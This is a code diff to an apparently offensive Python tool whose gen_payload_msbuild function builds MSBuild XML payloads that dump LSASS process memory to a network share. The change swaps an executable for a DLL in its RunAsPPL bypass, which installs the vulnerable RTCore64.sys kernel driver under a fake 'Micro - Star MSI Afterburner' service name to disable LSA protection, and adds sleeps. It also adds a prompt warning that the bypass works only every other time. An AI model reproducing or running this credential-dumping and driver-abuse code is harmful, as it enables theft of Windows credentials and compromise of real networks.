@@ -833,7 +833,7 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
     s = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     a = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     lines = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
-    RunAsPPLExe = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    RunAsPPLDll = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     ipEntry = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     ip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
@@ -863,6 +863,9 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
     xml_payload += "            %s = 0x00001000,\n" % (MiniDumpWithThreadInfo)
     xml_payload += "            %s = 0x00040000,\n" % (MiniDumpWithTokenInformation)
     xml_payload += "        };\n"
+    if runasppl:
+        xml_payload += "        [System.Runtime.InteropServices.DllImport(@\"%s:\\\\%s.dll\", EntryPoint = \"runninit\", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]\n" % (drive_letter, RunAsPPLDll)
+        xml_payload += "        static extern void runninit(string argus);\n"
 
     xml_payload += "        [System.Runtime.InteropServices.DllImport(\"dbghelp.dll\",\n"
     xml_payload += "              EntryPoint = \"MiniDumpWriteDump\",\n"
@@ -948,8 +951,11 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
     xml_payload += "                }\n"
     if runasppl:
         xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"sc.exe create RTCore64 type= kernel start= auto binPath= %s:\\\\RTCore64.sys DisplayName= \\\"Micro - Star MSI Afterburner\\\"\").WaitForExit();\n" % (drive_letter)
+        xml_payload += "                Thread.Sleep(1000);\n"
         xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"net start RTCore64\").WaitForExit();\n"
-        xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"%s:\\\\\" +\"%s.exe protect \" + %s().ToString() + \" PPL Lsa\").WaitForExit();\n" % (drive_letter, RunAsPPLExe, GetMyPID)
+        xml_payload += "                Thread.Sleep(1000);\n"
+        xml_payload += "                runninit(%s().ToString());\n" % (GetMyPID)
+        xml_payload += "                Thread.Sleep(1000);\n"
 
     xml_payload += "                string filePath = \"%s:\\\\\" + System.Net.Dns.GetHostName() + %s + \".dmp\";\n" % (drive_letter, thismachinesip)
     xml_payload += "                Process %s = Process.GetProcessById(%s());\n" % (p, GetPID)
@@ -974,8 +980,8 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
             f.write(addr + "\n")
         f.close()
     if runasppl:
-        os.system('sudo cp {}/src/runaspplexp /var/tmp/{}/{}.exe'.format(cwd, share_name, RunAsPPLExe))
-        os.system('sudo chmod uog+rx /var/tmp/{}/{}.exe'.format(share_name, RunAsPPLExe))
+        os.system('sudo cp {}/src/runasppldll /var/tmp/{}/{}.dll'.format(cwd, share_name, RunAsPPLDll))
+        os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, RunAsPPLDll))
 
         os.system('sudo cp {}/src/RTCore64.sys /var/tmp/{}/RTCore64.sys'.format(cwd, share_name))
         os.system('sudo chmod uog+rx /var/tmp/{}/RTCore64.sys'.format(share_name))
@@ -1347,7 +1353,9 @@ if __name__ == '__main__':
         sys.exit(0)
 
     if options.runasppl:
-        plzno = input("{}[!]{} RunAsPPL Bypass uses a kernel driver are you absolutely sure you want to use this? (y/N)".format(color_YELL, color_reset))
+        if options.debug == False:
+            print("I HIGHLY recommend turning on -debug")
+        plzno = input("{}[!]{} RunAsPPL Bypass uses a kernel driver are you absolutely sure you want to use this? Also this only works every other time (y/N): ".format(color_YELL, color_reset))
         if plzno.lower() != 'y':
             sys.exit(0)
 
